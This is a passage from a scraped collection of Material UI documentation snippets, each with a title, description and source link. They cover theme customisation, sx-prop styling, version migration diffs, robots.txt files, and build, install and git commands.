.MuiInputBase-input\n-.MuiInputBase-root .MuiInputBase-inputAdornedEnd\n+.MuiInputBase-root.MuiInputBase-adornedEnd > .MuiInputBase-input\n-.MuiInputBase-root .MuiInputBase-inputHiddenLabel\n+.MuiInputBase-root.MuiInputBase-hiddenLabel > .MuiInputBase-input\n```\n\n----------------------------------------\n\nTITLE: Configuring Web Crawler Access using robots.txt\nDESCRIPTION: Standard robots.txt configuration that allows unrestricted access to all web crawlers. The file uses standard robots.txt syntax to specify that all user agents (*) are allowed to access all content (no Disallow rules).\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-tailwind-ts/public/robots.txt#2025-04-22_snippet_0\n\nLANGUAGE: robotstxt\nCODE:\n```\nUser-agent: *\nDisallow:\n```\n\n----------------------------------------\n\nTITLE: Running Pigment CSS Next.js Demo App in Preview Mode\nDESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Next.js demo app in preview mode after automatically building it.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/README.md#2025-04-22_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\npnpm nx run @app/pigment-css-next-app:preview\n```\n\n----------------------------------------\n\nTITLE: Local Package Building Commands\nDESCRIPTION: Commands for building and packaging MUI components locally for testing.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$> cd packages/mui-material # or path to any other mui package\n$packages\\mui-material> pnpm build\n$packages\\mui-material> cd ./build\n$packages\\mui-material> pnpm pack\n```\n\n----------------------------------------\n\nTITLE: Testing Accordion Props Codemod Locally\nDESCRIPTION: Command for running a local test of the accordion-props codemod during development. This allows developers to check if the transformation is working correctly on a test file.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/CONTRIBUTING.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnode packages/mui-codemod/codemod deprecations/accordion-props packages/mui-codemod/src/deprecations/accordion-props/test-cases/theme.actual.js\n```\n\n----------------------------------------\n\nTITLE: Pushing Changes to Documentation Repository\nDESCRIPTION: Git command to push the selected changes to the material-ui-docs repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngit push material-ui-docs HEAD:latest\n```\n\n----------------------------------------\n\nTITLE: Setting fontWeight Using Shorthand Key with sx Prop in Material UI JSX\nDESCRIPTION: Shows the shorthand method for setting `fontWeight` by omitting the property prefix and using just the weight key (e.g., 'light') from `theme.typography` within the `sx` prop. This maps to `theme.typography.fontWeightLight`.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_13\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ fontWeight: 'light' }} />\n// equivalent to fontWeight: theme.typography.fontWeightLight\n```\n\n----------------------------------------\n\nTITLE: Gold Sponsors Display HTML\nDESCRIPTION: HTML code block for displaying Gold tier sponsor logos with tracking and styling attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/discover-more/backers/backers.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<p style=\"display: flex; justify-content: start; align-items: center; flex-wrap: wrap;\">\n  <a data-ga-event-category=\"sponsor\" data-ga-event-action=\"docs-backers\" data-ga-event-label=\"goread.io\" href=\"https://goread.io/?utm_source=mui.com&utm_medium=referral&utm_content=backers\" rel=\"noopener sponsored\" target=\"_blank\" class=\"remove-link-arrow\" style=\"margin-right: 16px; display:flex;\"><img height=\"26\" width=\"23\" src=\"https://images.opencollective.com/goread_io/eb6337d/logo/26.png\" srcset=\"https://images.opencollective.com/goread_io/eb6337d/logo/78.png 3x\" alt=\"goread.io\" title=\"Goread.io: Instagram followers, likes, views, and comments.\" loading=\"lazy\" style=\"margin-right: 6px;\" />Goread.io</a>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Returning to Previous Branch\nDESCRIPTION: Git command to switch back to the previously checked out branch.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ngit checkout -\n```\n\n----------------------------------------\n\nTITLE: Updating ImageListItemBar CSS Classes for Action Position Right\nDESCRIPTION: Transforms CSS selectors for ImageListItemBar's titleWrap when action position is right.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_45\n\nLANGUAGE: diff\nCODE:\n```\n- .MuiImageListItemBar-titleWrapActionPosRight\n+.MuiImageListItemBar-actionPositionRight > .MuiImageListItemBar-titleWrap\n```\n\n----------------------------------------\n\nTITLE: Embedding Images for Roadmap and Feature Illustrations - HTML Image Tag\nDESCRIPTION: This snippet uses the <img> HTML element within Markdown to insert graphical assets (e.g., product screenshots, feature illustrations) relevant to roadmap and announcement sections. It customizes image display properties with inline styles for size, maintains alternate text for accessibility, and ensures visual clarity in documentation. This pattern is repeated for icons, feature preview images, and design tool logos throughout the file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q1-update.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"/static/blog/2020-q1-update/figma.png\" alt=\"figma\" style=\"max-width: 160px; margin-bottom: 24px;\" />\n```\n\n----------------------------------------\n\nTITLE: Installing @mui/docs Package with npm\nDESCRIPTION: Command to install the @mui/docs package in your project. This package hosts the documentation building blocks for Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-docs/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/docs\n```\n\n----------------------------------------\n\nTITLE: Using MUI Slider with sx Prop in React (JSX)\nDESCRIPTION: This JSX snippet demonstrates rendering an MUI `Slider` component within a React application. It utilizes the `sx` prop to apply inline styling, specifically setting a vertical margin (`my: 1`, which typically translates to `margin-top: 8px; margin-bottom: 8px;` based on the default theme spacing, as indicated by the comment). Requires React and `@mui/material` dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/blog/blog-custom-card.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n// add margin: 8px 0px;\n<Slider sx={{ my: 1 }} />\n```\n\n----------------------------------------\n\nTITLE: Retrieving Feedback by ID\nDESCRIPTION: cURL command to retrieve feedback data for a specific UUID from the API.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/feedback/README.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncurl <API-URL>/feedback/d6890562-3606-4c14-a765-da81919057d1\n```\n\n----------------------------------------\n\nTITLE: Customizing Joy UI Components through Theme Configuration\nDESCRIPTION: This example shows how to customize specific component styles globally by targeting them directly in the theme. It demonstrates changing the default font size of all Button components to large using the component identifier in the theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/approaches/approaches.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\nimport Button from '@mui/joy/Button';\n\nconst theme = extendTheme({\n  components: {\n    // The component identifier always start with `Joy${ComponentName}`.\n    JoyButton: {\n      styleOverrides: {\n        root: ({ theme }) => {\n          // theme.vars.* return the CSS variables.\n          fontSize: theme.vars.fontSize.lg, // 'var(--joy-fontSize-lg)'\n        },\n      },\n    },\n  },\n});\n\nfunction MyApp() {\n  return (\n    <CssVarsProvider theme={theme}>\n      <Button>Text</Button>\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Starting Documentation Development Server\nDESCRIPTION: Command to start the local documentation development server.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\npnpm start\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Example Project\nDESCRIPTION: Commands to download and extract the Material UI Next.js TypeScript example project from GitHub repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-ts-v4-v5-migration/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-ts-v4-v5-migration\ncd material-ui-nextjs-ts-v4-v5-migration\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting the Material UI Preact Example\nDESCRIPTION: Commands to download the Material UI Preact example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-preact/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-preact\ncd material-ui-preact\n```\n\n----------------------------------------\n\nTITLE: Configuring Robots.txt Crawler Access - Plain Text\nDESCRIPTION: Specifies permissions for all user agents in robots.txt format, allowing full site access. The file contains a custom verification token as a comment and uses standard directives ('User-agent', 'Allow') recognized by web crawlers. No dependencies or parameters are required; the content should be placed at the root of the public directory to be recognized by search engines.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/public/robots.txt#2025-04-22_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n# Algolia-Crawler-Verif: 98C49CAFF7AEED76\\n\\nUser-agent: *\\nAllow: /\n```\n\n----------------------------------------\n\nTITLE: Using Material UI CSS Theme Variables in Plain CSS\nDESCRIPTION: This CSS snippet illustrates how Material UI's generated CSS theme variables can be directly used within a standard CSS file (e.g., `styles.css`) to style elements consistently with the Material UI theme. This requires enabling the `cssVariables` flag in the theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_2\n\nLANGUAGE: css\nCODE:\n```\n.custom-card {\n  background-color: var(--mui-palette-background-default);\n  color: var(--mui-palette-text-primary);\n  padding: var(--mui-spacing-2);\n  font: var(--mui-font-body1);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack for MUI System v7 Modern Bundle (JavaScript)\nDESCRIPTION: This JavaScript snippet shows how to configure Webpack to leverage the modern bundle in MUI System v7. By adding `'mui-modern'` to the `resolve.conditionNames` array, Webpack will prioritize the bundle that excludes legacy browser support, resulting in a potentially smaller application size.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// webpack.config.js\n{\n  resolve: {\n    conditionNames: ['mui-modern', '...'],\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Switching from React.forwardRef to Compatibility forwardRef Shim - TSX\nDESCRIPTION: Demonstrates the before-and-after usage of `forwardRef` that wraps React components, showing migration from React's built-in `forwardRef` to the custom compatibility shim. The corrected usage ensures stable prop references and avoids performance pitfalls due to changed ref behavior in React 19. Dependencies: React, project-specific `forwardRef` shim, `useGridState` hook. Parameters: `props`, `ref`. Outputs: a div element with ref and additional state/props. Limitations: Assumes that all props and state are properly spread and that the shim is in scope.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/react-19-update.md#2025-04-22_snippet_3\n\nLANGUAGE: tsx\nCODE:\n```\n// Before\nconst GridRoot = React.forwardRef((props, ref) => {\n  const state = useGridState();\n  return <div ref={ref} {...props} {...state} />;\n});\n\n// After\nconst GridRoot = forwardRef((props, ref) => {\n  const state = useGridState();\n  return <div {...props} {...state} ref={ref} />;\n});\n```\n\n----------------------------------------\n\nTITLE: Augmenting Palette Interfaces for Custom Tokens in TypeScript\nDESCRIPTION: Shows how to augment the PaletteOptions and Palette interfaces to add new tokens to the theme palette in TypeScript. This example adds gradient and border tokens.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_6\n\nLANGUAGE: ts\nCODE:\n```\ndeclare module '@mui/material/styles' {\n  interface PaletteOptions {\n    gradient: string;\n    border: {\n      subtle: string;\n    };\n  }\n  interface Palette {\n    gradient: string;\n    border: {\n      subtle: string;\n    };\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Box Component with createBox Utility\nDESCRIPTION: Shows how to create a custom version of the Box component using the createBox utility. This is useful for exposing the container to a different theme than the default library theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/box/box.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nimport { createBox, createTheme } from '@mui/system';\n\nconst defaultTheme = createTheme({\n  // your custom theme values\n});\n\nconst Box = createBox({ defaultTheme });\n\nexport default Box;\n```\n\n----------------------------------------\n\nTITLE: Removing default fontSize prop from SvgIcon in React\nDESCRIPTION: Removes the fontSize=\"default\" prop from SvgIcon as the default value was changed from 'default' to 'medium' for consistency.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_25\n\nLANGUAGE: diff\nCODE:\n```\n-<SvgIcon fontSize=\"default\">\n+<SvgIcon>\n   <path d=\"M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z\" />\n </SvgIcon>\n```\n\n----------------------------------------\n\nTITLE: Building and Publishing MUI Internal Test Utils Package\nDESCRIPTION: Commands for building the project and publishing the build artifacts to npm. These steps are typically part of the release process for the @mui/internal-test-utils package.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/test-utils/README.md#2025-04-22_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n1. Build the project: `pnpm build`\n2. Publish the build artifacts to npm: `pnpm release:publish`\n```\n\n----------------------------------------\n\nTITLE: Importing Flexbox Utilities from Material-UI System in JavaScript\nDESCRIPTION: Shows how to import flexbox utilities from the @mui/system package to use them in custom components or styling solutions. These utilities provide a programmatic way to apply flexbox properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_10\n\nLANGUAGE: js\nCODE:\n```\nimport { flexbox } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Number-based Theme Spacing in Material-UI\nDESCRIPTION: Demonstrates spacing transformation when theme spacing is configured as a number. The prop value is multiplied by the theme value to generate pixel-based margins.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = {\n  spacing: 8,\n}\n\n<Box sx={{ m: -2 }} /> // margin: -16px;\n<Box sx={{ m: 0 }} /> // margin: 0px;\n<Box sx={{ m: 0.5 }} /> // margin: 4px;\n<Box sx={{ m: 2 }} /> // margin: 16px;\n```\n\n----------------------------------------\n\nTITLE: Configuring webpack for styled-components with Material UI\nDESCRIPTION: Shows how to update webpack.config.js to add an alias that replaces the default styling engine with styled-components when using npm.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/styled-components/styled-components.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n```diff title=\"webpack.config.js\"\n module.exports = {\n   //...\n+  resolve: {\n+    alias: {\n+      '@mui/styled-engine': '@mui/styled-engine-sc'\n+    },\n+  },\n };\n```\n```\n\n----------------------------------------\n\nTITLE: TypeScript Declaration for Custom Shadow Keys\nDESCRIPTION: Shows how to augment the Shadow interface in TypeScript when adding custom shadow keys to the Joy UI theme, ensuring type safety and autocompletion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-shadow/theme-shadow.md#2025-04-22_snippet_2\n\nLANGUAGE: ts\nCODE:\n```\n// You can put this to any file that's included in your tsconfig\ndeclare module '@mui/joy/styles' {\n  interface Shadow {\n    subtle: string;\n    strong: string;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Typography Scale Configuration\nDESCRIPTION: Theme configuration for creating custom typography scales with custom styles and CSS selectors.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/typography/typography.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nextendTheme({\n  typography: {\n    subtitle: {\n      fontSize: 'var(--joy-fontSize-lg)',\n      fontWeight: 'var(--joy-fontWeight-md)',\n      '& + p': {\n        marginTop: '4px',\n      },\n    },\n    label: {\n      fontSize: 'var(--joy-fontSize-sm)',\n      fontWeight: 'var(--joy-fontWeight-lg)',\n      lineHeight: 'var(--joy-lineHeight-lg)',\n      marginBottom: '3px',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Radio Component HTML Structure\nDESCRIPTION: The HTML structure of a Radio component showing nested span elements for the radio button, icon, action, input, and label.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/radio-button/radio-button.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<span class=\"MuiRadio-root\">\n  <span class=\"MuiRadio-radio\">\n    <span class=\"MuiRadio-icon\"></span>\n    <span class=\"MuiRadio-action\">\n      <input class=\"MuiRadio-input\">\n    </span>\n  </span>\n  <label class=\"MuiRadio-label\">\n</span>\n```\n\n----------------------------------------\n\nTITLE: Migrating Raised Button from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Raised Button components from Material-UI v0.x to v1.x using the Button component with the contained variant.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n-import RaisedButton from 'material-ui/RaisedButton';\n+import Button from '@material-ui/core/Button';\n\n-<RaisedButton />\n+<Button variant=\"contained\" />\n```\n\n----------------------------------------\n\nTITLE: Replacing Grid 'true' Value with 'grow' in React\nDESCRIPTION: In Material UI v6, the Grid component's boolean 'true' value for size props is replaced with the string 'grow', as shown in this migration example.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid xs>\n+<Grid size=\"grow\">\n```\n\n----------------------------------------\n\nTITLE: Using Channel Tokens in Typography Component - Joy UI\nDESCRIPTION: Demonstrates how to use channel tokens to create translucent colors with rgba in Joy UI Typography component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-colors/theme-colors.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport Typography from '@mui/joy/Typography';\n\n<Typography\n  sx={theme => ({\n    color: `rgba(${theme.vars.palette.primary.mainChannel} / 0.72)`,\n  })}\n>\n```\n\n----------------------------------------\n\nTITLE: Implementing Fluid Container in React MUI\nDESCRIPTION: Creates a fluid container with a maximum width defined by the maxWidth prop. The width is responsive and bounded by the specified size (sm in this example).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/container/container.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Container maxWidth=\"sm\">\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI v4 and React 17 with Yarn\nDESCRIPTION: Command to upgrade Material UI to v4.11.2 and React to v17 using Yarn. This is a necessary step before migrating to v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nyarn upgrade @material-ui/core@^4.11.2 react@^17.0.0\n```\n\n----------------------------------------\n\nTITLE: HTML Button with Title for Accessibility\nDESCRIPTION: Example of HTML button with title attribute that acts as an accessible description, illustrating the difference between labeling and describing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/tooltip/tooltip.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<button title=\"some more information\">A button</button>\n```\n\n----------------------------------------\n\nTITLE: Configuring Robot.txt Access Rules\nDESCRIPTION: Default robots.txt configuration that allows all user agents full access to the site without any restrictions. References robots.txt standard specification.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components/public/robots.txt#2025-04-22_snippet_0\n\nLANGUAGE: robotstxt\nCODE:\n```\n# https://www.robotstxt.org/robotstxt.html\nUser-agent: *\nDisallow:\n```\n\n----------------------------------------\n\nTITLE: Installing Emotion Dependencies with Yarn\nDESCRIPTION: Command to add Emotion packages using Yarn. These are required peer dependencies for Material UI v5's styling system.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Generating Background Colors for Letter Avatars\nDESCRIPTION: Demonstrates how to use different background colors for avatars, generating the color based on the name of the person.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"BackgroundLetterAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Running JSS to Styled Components Codemod\nDESCRIPTION: Command to execute the automated codemod that converts JSS styles to styled API\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/jss-to-styled <path>\n```\n\n----------------------------------------\n\nTITLE: Linear Progress with use-count-up Integration\nDESCRIPTION: Demonstrates how to integrate the LinearProgress component with the use-count-up package to create animated counting effects alongside the progress bar.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/linear-progress/linear-progress.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nLinearProgressCountUp.js\n```\n\n----------------------------------------\n\nTITLE: Updating Collapse Props\nDESCRIPTION: Renames collapsedHeight prop to collapsedSize and updates classes key.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n-<Collapse collapsedHeight={40}>\n+<Collapse collapsedSize={40}>\n\n-<Collapse classes={{ container: 'collapse' }}>\n+<Collapse classes={{ root: 'collapse' }}>\n```\n\n----------------------------------------\n\nTITLE: Configuring themed components with CSS variables\nDESCRIPTION: Example of using theme variables in component customization through theme extension.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nextendTheme({\n  components: {\n    JoyButton: {\n      root: ({ theme }) => ({\n        // Outputs 'var(--joy-fontFamily-display)'\n        fontFamily: theme.vars.fontFamily.display,\n      }),\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Removing default typography levels in Joy UI\nDESCRIPTION: Example of how to remove unwanted typography levels from the theme by setting them to undefined in the theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nconst customTheme = extendTheme({\n  typography: {\n    'title-sm': undefined,\n    'title-xs': undefined,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Dependencies with npm\nDESCRIPTION: Command to install the required dependencies for integrating Material UI with Next.js App Router using npm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material-nextjs @emotion/cache\n```\n\n----------------------------------------\n\nTITLE: Generating API Documentation Commands\nDESCRIPTION: Commands to update the component API documentation after making changes to TypeScript declaration files.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ pnpm proptypes\n$ pnpm docs:api\n```\n\n----------------------------------------\n\nTITLE: Tooltip Button Group Integration\nDESCRIPTION: Example showing ButtonGroup implementation with Tooltip components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button-group/button-group.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"TooltipButtonGroup.js\"}\n```"
  }
]